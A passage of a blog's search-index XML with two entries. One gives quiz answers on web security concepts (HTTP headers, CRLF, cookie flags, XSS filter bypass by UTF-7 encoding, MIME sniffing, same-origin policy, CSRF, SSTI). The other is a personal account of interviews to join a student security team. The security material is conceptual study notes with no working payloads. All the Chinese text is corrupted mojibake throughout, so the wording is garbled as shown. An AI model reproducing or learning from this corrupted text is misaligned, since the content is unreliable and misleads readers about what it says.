class="hljs-params">(header)</span>ï¼šå¯ä»¥æœ‰é›¶ä¸ªæˆ–å¤šä¸ªå¤´éƒ¨ï¼Œæ¯ä¸ªé¦–éƒ¨éƒ½åŒ…å«ä¸€ä¸ªåå­—ï¼Œåé¢è·Ÿç€ä¸€ä¸ªå†’å·<span class="hljs-params">(:)</span>ï¼Œç„¶åæ˜¯ä¸€ä¸ªå¯é€‰çš„ç©ºæ ¼ï¼Œæ¥ç€æ˜¯ä¸€ä¸ªå€¼ï¼Œæœ€åæ˜¯ä¸€ä¸ª<span class="hljs-title function_">CRLF</span>é¦–éƒ¨æ˜¯ç”±ä¸€ä¸ªç©ºè¡Œ<span class="hljs-params">(CRLF)</span>ç»“æŸçš„ï¼Œè¡¨ç¤ºäº†å¤´éƒ¨åˆ—è¡¨çš„ç»“æŸå’Œå®ä½“ä¸»ä½“éƒ¨åˆ†çš„å¼€å§‹<br><br>7ã€å®ä½“çš„ä¸»ä½“éƒ¨åˆ†<span class="hljs-params">(entity-body)</span>ï¼šå®ä½“çš„ä¸»ä½“éƒ¨åˆ†åŒ…å«ä¸€ä¸ªç”±ä»»æ„æ•°æ®ç»„æˆçš„æ•°æ®å—ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„æŠ¥æ–‡éƒ½åŒ…å«å®ä½“çš„ä¸»ä½“éƒ¨åˆ†ï¼Œæœ‰æ—¶ï¼ŒæŠ¥æ–‡åªæ˜¯ä»¥ä¸€ä¸ª<span class="hljs-title function_">CRLF</span>ç»“æŸã€‚<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217225853.png" alt="QQæˆªå›¾20220217225853"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">2.</span>ä»€ä¹ˆæ˜¯<span class="hljs-literal">crlf</span>ï¼Ÿåœ¨<span class="hljs-keyword">http</span>æŠ¥æ–‡çš„å“ªä¸ªä½ç½®ã€‚ï¼ˆ<span class="hljs-number">1</span>åˆ†ï¼‰<br>å·²ç­”ã€‚å›è½¦æ¢è¡Œï¼Œæ¯è¡Œæœ«ä½ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.è§£é‡Šä¸‹è¿™å‡ ä¸ªå¤´çš„å«ä¹‰ï¼ˆ<span class="hljs-number">5</span>åˆ†ï¼‰<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217230327.png" alt="QQæˆªå›¾20220217230327"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-number">4</span>ã€cookieå…·æœ‰å“ªäº›ç‰¹ç‚¹ï¼Œä¸åŒçš„åŸŸåå’Œå­åŸŸåå¯¹cookieæœ‰æ€æ ·çš„æƒé™ï¼ŸCookieçš„Secureå’Œ HTTPOnlyè¿™ä¸¤ä¸ªflagåˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿè¯·ç»“åˆxssæ”»å‡»æ¥è¿›è¡Œè¯´æ˜ï¼ˆ<span class="hljs-number">3</span>åˆ†ï¼‰<br><br>ä»¥é”®å€¼å¯¹çš„å½¢å¼ä¸´æ—¶å­˜åœ¨ã€‚ä¸ºåŸŸåè®¾ç½®çš„cookieï¼Œå­åŸŸåä¹Ÿå¯è¯»ã€‚å­åŸŸååªå¯å†™è‡ªèº«çš„cookieã€‚<br><br><span class="hljs-symbol">Secure:</span>é™åˆ¶åªæœ‰é€šè¿‡httpsè®¿é—®æ—¶æ‰èƒ½ä¼ é€’cookie<br><br><span class="hljs-symbol">httponly:</span>é˜»æ­¢JavaScriptè¯»å–cookieï¼Œå¯é˜²xssæ”»å‡»<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">5.ç®€è¿°æœ¬è§†é¢‘æåˆ°çš„xssç»•è¿‡webé˜²ç«å¢™çš„æ–¹æ¡ˆï¼ˆ5åˆ†ï¼‰<br>ç”¨UTF<span class="hljs-string">-7</span>/UTF<span class="hljs-string">-32</span>ç¼–ç payload<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">6.å†…å®¹å—…æ¢æ˜¯ä»€ä¹ˆï¼Ÿä¸»è¦æœ‰å“ªäº›ç±»å‹ï¼Ÿè¯·åˆ†åˆ«ä¸¾ä¾‹ï¼Œä¸»è¦ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿåœ¨ä»€ä¹ˆæƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´ï¼Ÿã€‚ä¸ºä»€ä¹ˆfacebookç­‰ç½‘ç«™éœ€è¦ä½¿ç”¨ä¸åŒçš„åŸŸåæ¥å­˜å‚¨å›¾ç‰‡ï¼Ÿï¼ˆ5åˆ†ï¼‰<br>é€šè¿‡è§£ææ–‡ä»¶çš„å†…å®¹ï¼Œæ¥çŒœæµ‹MIMEç±»å‹çš„æ ¼å¼ã€‚æœ‰æµè§ˆå™¨å—…æ¢å’Œå®¢æˆ·ç«¯å—…æ¢ã€‚å®¢æˆ·ç«¯å—…æ¢å¯ç”¨æ¥åˆ¤æ–­æµè§ˆå™¨ä¸ºä»€ä¹ˆæµè§ˆå™¨ã€‚<br><br>æœ‰äº›MIMEç±»å‹æ˜¯å¯æ‰§è¡Œç±»å‹ï¼Œå¯ä»¥é€šè¿‡æ··æ·†MIMEå—…æ¢ç®—æ³•æ¥æ‰§è¡ŒXSSã€‚<br><br>é˜²æ­¢å†…å®¹å—…æ¢ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">7.åŒæºç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿé™åˆ¶æ˜¯ä»€ä¹ˆï¼Ÿæµè§ˆå™¨åœ¨é‡åˆ°å“ªä¸¤ç§æƒ…å†µçš„æ—¶å€™ä¼šç”¨åˆ°åŒæºç­–ç•¥ï¼Ÿå¦‚ä½•æ”¾æ¾SOPé™åˆ¶ï¼Ÿæ”¾æ¾SOPé™åˆ¶ä¼šå¯¹æµè§ˆå™¨æ’ä»¶å®‰å…¨é€ æˆæ€æ ·çš„ç ´åï¼Ÿ<br><br></code></pre></td></tr></table></figure><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">8.</span>csrfæ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•è®¾è®¡è§„é¿csrfï¼Ÿè§†é¢‘ä¸­æåˆ°çš„é”™è¯¯çš„csrfé…ç½®æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Ÿ<br>è·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚<br><br>éªŒè¯<span class="hljs-built_in">token</span>ï¼ŒéªŒè¯HTTPè¯·æ±‚çš„Refererï¼Œè¿˜æœ‰éªŒè¯XHRé‡Œçš„è‡ªå®šä¹‰<span class="hljs-built_in">header</span>ã€‚<br><br>æ²¡æœ‰å¯¹è¯·æ±‚æ¥æºè¿›è¡ŒéªŒè¯/è¿‡æ»¤<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">é™„åŠ é¢˜ï¼š5ã€6ä¸¤ç‚¹ä¸»è¦åˆ©ç”¨çš„æ˜¯ç”±äºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯å¯¹åŒä¸€ä¿¡æ¯çš„å¤„ç†æ–¹å¼ä¸åŒé€ æˆçš„æ¼æ´ï¼Œä½ è¿˜èƒ½ä¸¾å‡ºç›¸ä¼¼çš„ä¾‹å­ä¹ˆï¼Ÿï¼ˆ1åˆ†ï¼‰<br>SSTI<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å†ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†ç¨‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¿›å…¥é“æ ¼çš„é‚£äº›äº‹</title>
    <link href="/2022/02/24/%E8%BF%9B%E5%85%A5%E9%81%93%E6%A0%BC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <url>/2022/02/24/%E8%BF%9B%E5%85%A5%E9%81%93%E6%A0%BC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="è®°å½•è¿›å…¥é“æ ¼çš„é‚£äº›äº‹"><a href="#è®°å½•è¿›å…¥é“æ ¼çš„é‚£äº›äº‹" class="headerlink" title="è®°å½•è¿›å…¥é“æ ¼çš„é‚£äº›äº‹"></a>è®°å½•è¿›å…¥é“æ ¼çš„é‚£äº›äº‹</h1><p>ç”±äºæ¢äº†ç”µè„‘ï¼Œæ¯æ¬¡ç»™ä¸­å“¥äº¤æŠ¥å‘Šçš„æ—¶å€™ï¼Œä¸­å“¥éƒ½ä¼šè¯´åšä¸ªå›¾åºŠå§ã€‚å®³ï¼Œä¹‹å‰çš„æˆªå›¾ä¸è§äº†ï¼ˆè‡ªå·±åˆå»æˆªå›¾äº†ä¸‹ï¼‰ã€‚</p><p>æœ‰ä¸€è¯´ä¸€æ„Ÿè§‰è¿›é“æ ¼æœ‰ä¸ªæ‰‹å°±è¡Œï¼ˆå¯èƒ½ç¥ç»æœ‰ç‚¹ä¸æ­£å¸¸emmmm~~ï¼‰ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°è¿™ä¸€è·¯è¿‡æ¥è¿™ä¹ˆåå·ã€‚</p><h2 id="ç¬¬ä¸€æ¬¡é¢è¯•"><a href="#ç¬¬ä¸€æ¬¡é¢è¯•" class="headerlink" title="ç¬¬ä¸€æ¬¡é¢è¯•"></a>ç¬¬ä¸€æ¬¡é¢è¯•</h2><p>åœ¨ç¬¬ä¸€æ¬¡é¢è¯•ä¹‹å‰ï¼Œå·²ç»æ°´äº†ä¸€ä¸ªå­¦æœŸäº†ã€‚æˆ‘ä¸€ç›´è§‰å¾—æˆ‘è·Ÿå¤§äºŒçš„å­¦ç”Ÿä¸€ä¸ªæ°´å¹³ï¼ˆèœœæ±è‡ªä¿¡ï¼‰ï¼Œåæ¥å‘ç°å¤§äºŒçš„å­¦ç”Ÿéƒ½æ˜¯å¯ä»¥è‡ªä¸»åˆ†æpopé“¾äº†ï¼Œè€Œæˆ‘è¿˜æ²‰è¿·åœ¨åŸºæœ¬æ¼æ´ã€‚ç„¶åç¬¬ä¸€æ¬¡é¢è¯•ï¼Œåœ¨å¼€å­¦çš„é‚£å‡ å¤©ï¼Œç„¶åç¬¬ä¸€æ¬¡é‡è§ä¸­å“¥ï¼Œè¿›è¡Œäº†å¼€å¼€å¿ƒå¿ƒçš„é¢è¯•ï¼ˆä¸­å“¥å¤ªå‹å¥½äº†ï¼Œè·Ÿä»–çš„æ­£ç»ä¸åŒ¹é…ï¼‰ã€‚å½“ç„¶è¿™ç¬¬ä¸€æ¬¡ä¹Ÿæ²¡æœ‰æ­£å¼è¿›å…¥é“æ ¼ã€‚ä½†æ˜¯è¢«å¤¸äº†åŸºç¡€å¥½ï¼Œä¸çŸ¥é“æ˜¯é¼“åŠ±çš„è¯è¿˜æ˜¯ä»€ä¹ˆè¯ã€‚ç„¶åå­¦å­¦javaï¼Œç„¶åå°±æ­¥å…¥äº†æ¼«é•¿çš„å­¦ä¹ ã€‚ä¸­å“¥å¯¹ç†Šæµ·çš„è¯„ä»·ï¼Œåé¢æƒ³äº†ä¸€æ™šä¸Šï¼Œç¬¬äºŒå¤©è·Ÿä¸­å“¥æ·±æ·±çš„äº¤æµäº†ä¸€ä¸‹ã€‚åšå¥½å†³å®šè®¤çœŸå­¦ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A53.png" alt="ä¸­å“¥3"></p><h2 id="ç¬¬äºŒæ¬¡é¢è¯•"><a href="#ç¬¬äºŒæ¬¡é¢è¯•" class="headerlink" title="ç¬¬äºŒæ¬¡é¢è¯•"></a>ç¬¬äºŒæ¬¡é¢è¯•</h2><p>ç»ˆäºç»å†äº†1ä¸ªåŠæœˆçš„å­¦ä¹ javaï¼Œå†ä¸€æ¬¡æ¥é¢è¯•ã€‚æˆ‘ä¿¡å¿ƒåè¶³ï¼Œä¹Ÿè®¸æˆ‘æ‰20å²ï¼Œå¯¹ä»»ä½•äº‹éƒ½æ˜¯å……æ»¡äº†ä¿¡å¿ƒã€‚æˆ‘å†ä¸€æ¬¡è§‰å¾—æˆ‘è‚¯å®šèƒ½è¿›é“æ ¼äº†ã€‚é¢è¯•ä¹Ÿä¸é”™ï¼Œä¸­å“¥ä¹Ÿè¯´æˆ‘è¿›åº¦è·Ÿçš„ä¸é”™ï¼Œä½†æ˜¯ä»–å°½ç„¶è®©æˆ‘è‡ªæˆ‘ä»‹ç»ä¸€ä¸‹ï¼ï¼ï¼ï¼ï¼ˆå¿…é¡»åæ§½ä¸€ä¸‹ï¼‰äººéƒ½ç»™æˆ‘æ•´å‚»äº†ã€‚ç»“æŸçš„æ—¶å€™ä»–è¯´ï¼Œè¦å›¢é˜Ÿå•†é‡ä¸‹ã€‚å®³~~ï¼Œæˆ‘è¿™è‡ªä¿¡å†ä¸€æ¬¡è¢«æ‰“å‡»ã€‚ä¸è¿‡è¿™æ¬¡çš„æ‰“å‡»è·Ÿä¸Šä¸€æ¬¡ä¸åŒï¼Œæˆ‘æ„Ÿè§‰åœ¨é€—æˆ‘ç©å‘¢ã€‚ä½†æ˜¯æ²¡åŠæ³•ç¡®å®å®åŠ›ä¸è¶³ï¼Œä¹Ÿè®¸æˆ‘ä¼šçš„è·Ÿå¤§äºŒçš„ä¸€æ ·å¤šï¼Œpopé“¾æˆ‘ä¹Ÿå¯ä»¥ä¿¡æ‰‹æ²¾æ¥ï¼Œä¸­å“¥å°±ä¸ä¼šä¸€è€Œå†çš„çŠ¹è±«~ï¼Œä¸è¿‡ä»–ä¸€å¦‚æ—¢å¾€çš„å¥½ï¼Œè®©æˆ‘å½“äº†ä¸ªé“æ ¼å®ä¹ æˆå‘˜ã€‚ï¼ˆæˆ‘æ€€ç–‘è¿™æ˜¯å²æ— å‰ä¾‹çš„ï¼‰ï¼Œç„¶åè¿›å…¥æœ€ç»ˆè€ƒæ ¸ï¼ŒæŒ–æ´ï¼æˆ‘ä»¥å‰æƒ³éƒ½ä¸æ•¢æƒ³ã€‚è®°å¾—ç¬¬ä¸€æ¬¡é¢è¯•ä¹‹å‰ï¼Œä¸­å“¥è®©æˆ‘å®¡è®¡ç†Šæµ·cmsæˆ‘å½“æ—¶å€™ï¼Œçœ‹åˆ°é‚£ä¹ˆå¤šçš„ä»£ç ï¼ŒçœŸçš„æ˜¯å‚»ä¹ä¹ï¼Œæ— ä»ä¸‹æ‰‹ã€‚å¿˜è®°è¯´äº†ï¼æ˜¯é‚£ä¸ªé“æ ¼ç®¡ç†å‘˜è¯´ä»–å«é™ˆå˜‰è‰ï¼ï¼ï¼æˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯ä¸ªå­¦å§ï¼Œè¿˜æ˜¯ä¸ªæ¸©æŸ”çš„å­¦å§ï¼ï¼åæ¥æ‰çŸ¥é“æ˜¯ä¸ªç”·ç”Ÿï¼</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A52.png" alt="ä¸­å“¥2"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A5.png" alt="ä¸­å“¥"></p><h2 id="ç»§ä¸€ã€äºŒæ¬¡é¢è¯•æ„Ÿå—"><a href="#ç»§ä¸€ã€äºŒæ¬¡é¢è¯•æ„Ÿå—" class="headerlink" title="ç»§ä¸€ã€äºŒæ¬¡é¢è¯•æ„Ÿå—"></a>ç»§ä¸€ã€äºŒæ¬¡é¢è¯•æ„Ÿå—</h2><p>å‰å‰ååä¸€ä¸ªåŠæœˆå§ã€‚ç»™æˆ‘çš„æœ€å¤§æ„Ÿå—å°±æ˜¯ï¼Œå­¦ä¹ ä¿¡å®‰çš„è¿™æ¡è·¯ä¸Šè¦å°‘èµ°å¼¯è·¯ï¼Œä½†æ˜¯ä¸è¦æ€•èµ°å¼¯è·¯ï¼ŒäºŒè€…éƒ½å¯ä»¥ç»™ä½ åŒç­‰çš„æˆé•¿ã€‚è°¢è°¢åœ¨æˆ‘çš„å¤§äºŒä¸Šçš„è¿™å­¦æœŸï¼Œè®©æˆ‘ç¢°åˆ°ä¸­å“¥ã€‚</p><p>ä»–è¿˜ä¸æŠŠå­¦ä¹ èµ„æ–™è®©æˆ‘ç™½å«–ï¼Œè‡³ä»Šæˆ‘è¿˜æ˜¯ä¸èƒ½ç†è§£ä¸ºä»€ä¹ˆï¼ï¼ï¼ä¹Ÿè®¸åé¢æˆ‘ä¼šæ‡‚~~~æ˜¯ä¸æ˜¯ä»–è§‰å¾—å¤ªä¾¿å®œäº†ã€‚200å¯ä»¥è·Ÿå¥³æœ‹å‹æ’¸ç®¡ä¸¤æ¬¡äº†ã€‚</p><p>å­¦æŠ€æœ¯è·¯ä¸Šç¢°åˆ°è¿™æ ·ä¸€ä½æ©å¸ˆï¼Ÿå“ˆå“ˆå“ˆå“ˆå“ˆæˆ‘è§‰å¾—è‚¯å®šæ˜¯èƒ½å¤Ÿç®—çš„ä¸Šæˆ‘å¸ˆçˆ¶çš„ï¼Œå­¦ä¹ è·¯ä¸Šè®©æˆ‘å°‘æ‰“ç‚¹ç‹è€…ï¼Œé—®é—®é¢˜ä¹Ÿä¼šæŠ½ç©ºå›ç­”æˆ‘ã€‚å¤ªçˆ±äº†ï¼ï¼ï¼</p><p>å‰å‰ååè¿˜æœ‰å¾ˆå¤šäº‹ã€‚æœ‰äº›å¤ªéº»çƒ¦äº†ï¼Œå°±æ‡’å¾—è¯´äº†ã€‚å®³~~ï¼Œå¸Œæœ›æˆ‘æœªæ¥çš„é“è·¯ä¸Šï¼Œèƒ½å¤Ÿé‡åˆ°å¾ˆå¤šä¸­å“¥è¿™æ ·çš„äººï¼å¥½å¥½åšå¥½æ¥ä¸‹æ¥çš„ä»»åŠ¡â€¦.é©¬ä¸Šå°±è¦è¿›å…¥é“æ ¼äº†ï¼åšæŒï¼</p><h2 id="ç¬¬ä¸‰æ¬¡é¢è¯•"><a href="#ç¬¬ä¸‰æ¬¡é¢è¯•" class="headerlink" title="ç¬¬ä¸‰æ¬¡é¢è¯•"></a>ç¬¬ä¸‰æ¬¡é¢è¯•</h2><p>å¤ªä¹…äº†ï¼Œå¿˜è®°äº†å“ˆå“ˆå“ˆå“ˆ~~</p><h2 id="æœ€åä¸€æ¬¡"><a href="#æœ€åä¸€æ¬¡" class="headerlink" title="æœ€åä¸€æ¬¡"></a>æœ€åä¸€æ¬¡</h2><p>ä¸­å“¥å¤ªå¿™äº†ã€‚ç»“æœæ˜¯åˆ«çš„å¸ˆå‚…é¢è¯•çš„ã€‚ï¼ˆè¯´å®è¯è‡ªå·±ä¸åº”è¯¥è¿›é“æ ¼çš„ï¼Œä½†æ˜¯ç»™äº†æˆ‘è¿™ä¸ªæœºä¼šï¼Œå°±å¥½å¥½æŠŠæ¡ä½ã€‚<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220224203017.png" alt="QQæˆªå›¾20220224203017"></p><p>â€‹    </p>]]></content>
    
    
    <categories>
      
      <category>å†ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†ç¨‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
